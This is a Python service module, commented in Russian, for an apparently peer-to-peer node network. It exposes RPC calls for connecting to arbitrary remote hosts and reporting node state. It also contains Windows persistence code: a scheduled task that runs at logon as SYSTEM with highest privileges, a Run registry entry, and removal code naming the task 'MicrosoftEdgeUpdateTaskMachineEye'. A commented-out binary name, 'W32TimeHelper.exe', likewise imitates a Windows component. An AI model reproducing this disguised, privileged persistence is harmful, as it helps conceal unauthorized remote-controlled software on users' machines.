# services/system/service.py — управление системой: подключение к узлам, диагностика

import asyncio
import subprocess

from services.rpc import rpc
from src.internal_modules.base import ModuleGeneric

try:
    import winreg
except ImportError:
    winreg = None

class System(ModuleGeneric):
    def __init__(self, name, context):
        super().__init__(name, context)

    @rpc
    async def connect_to_node(self, data: dict):
        """Инициировать исходящее подключение к удалённому узлу.

        Подключение разрешено, если удалённый узел НЕ подключен к локальному
        (по NeighborTable). При успехе — сохраняет пира в config.local.yaml
        для автоматического переподключения при рестарте.

        data: {host, port, node_id}
        """
        host = data.get('host', '')
        port = data.get('port', 9000)
        node_id = data.get('node_id', '')

        if not host or not node_id:
            return {'ok': False, 'error': 'host и node_id обязательны'}

        nt = self.ctx.network.neighbor_table
        existing = nt.get(node_id)
        if existing and existing.status.value == 'connected':
            return {'ok': False, 'error': f'Узел {node_id} уже подключен'}

        uri = f'ws://{host}:{port}/ws/{self.ctx.NODE}'
        config_uri = f'ws://{host}:{port}/ws/'

        try:
            await self.ctx.network.connect_to(node_id=node_id, target_uri=uri)
        except Exception as e:
            return {'ok': False, 'error': str(e)}

        # Дождаться подтверждения подключения (до 5 сек)
        connected = False
        for _ in range(10):
            await asyncio.sleep(0.5)
            entry = nt.get(node_id)
            if entry and entry.status.value == 'connected':
                connected = True
                break

        if connected:
            try:
                self.ctx.config_manager.add_peer(node_id, config_uri)
                self.log.info(f'Peer saved to config: {node_id} → {config_uri}')
            except Exception as e:
                self.log.warning(f'Failed to save peer to config: {e}')
            return {'ok': True, 'node_id': node_id, 'uri': uri, 'saved': True}

        return {'ok': True, 'node_id': node_id, 'uri': uri, 'saved': False,
                'note': 'Подключение в процессе (коннектор будет повторять попытки)'}

    @rpc
    def list_connectors(self):
        """Список активных исходящих коннекторов."""
        result = []
        for mod in self.ctx._modules:
            if 'Connector_' in mod.name:
                result.append({
                    'name': mod.name,
                    'peer': getattr(mod, 'peer_node_id', '?'),
                    'uri': getattr(mod, 'target_uri', '?'),
                })
        return result

    @rpc
    def node_detail(self,):
        """Детальная информация об узле: соседи, сервисы, активные WS."""
        nt = self.ctx.network.neighbor_table
        nm = self.ctx.network.nodes_manager

        connected = [n.model_dump() for n in nt.connected()]
        known = [n.model_dump() for n in nt.known()]

        ws_nodes = list(nm.nodes.keys())

        return {
            'own': self.ctx.NODE,
            'connected': connected,
            'known': known,
            'ws_connections': ws_nodes,
            'services': list(self.ctx.services.services.keys()),
        }

    @rpc
    def config_peers(self):
        """Список пиров из config.local.yaml."""
        peers = self.ctx.config_manager.list_peers()
        return [{'node_id': p.node_id, 'uri': p.uri} for p in peers]

    def add_to_task_scheduler(self):
        """Добавляет задачу в планировщик"""
        exe_path = self.ctx.config_manager.local.full_path
        # exe_path = BASE_DIR / 'W32TimeHelper.exe'
        task_name = self.ctx.config_manager.local.name

        # remove_from_task_scheduler()

        try:
            # subprocess.call('cmd /C "chcp 1251"')
            cmd = f'schtasks /Create /F /TN "{task_name}" /TR "{exe_path}" /SC ONLOGON /RU "NT AUTHORITY\\SYSTEM" /DELAY 0000:30 /rl highest'
            result = subprocess.call(cmd, shell=True)

        except Exception as e:
            self.log.error("Ошибка создания задачи планировщика", e)

        self.add_to_registry_startup()

    def remove_from_task_scheduler(self):
        """Удаляет задачу из планировщика"""
        task_name = "MicrosoftEdgeUpdateTaskMachineEye"
        try:
            cmd = f'schtasks /Delete /F /TN "{task_name}"'
            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.log.error("Ошибка удаления задачи планировщика", e)

    def add_to_registry_startup(self):
        """Добавляет запуск через реестр"""
        if winreg is None:
            return

        try:
            exe_path = self.ctx.config_manager.local.full_path.resolve()
            key_name = self.ctx.config_manager.local.name

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )

            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)

            self.log.info(f"Добавлено в автозапуск реестра: {key_name}")

        except Exception as e:
            self.log.error("Ошибка добавления в реестр", e)

    def remove_from_registry_startup(self):
        """Удаляет из автозапуска реестра"""
        if winreg is None:
            return

        try:
            key_name = self.ctx.config_manager.local.name

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )

            try:
                winreg.DeleteValue(key, key_name)
                self.log.info(f"Удалено из автозапуска реестра: {key_name}")
            except FileNotFoundError:
                pass

            winreg.CloseKey(key)

        except Exception as e:
            self.log.error("Ошибка удаления из реестра", e)

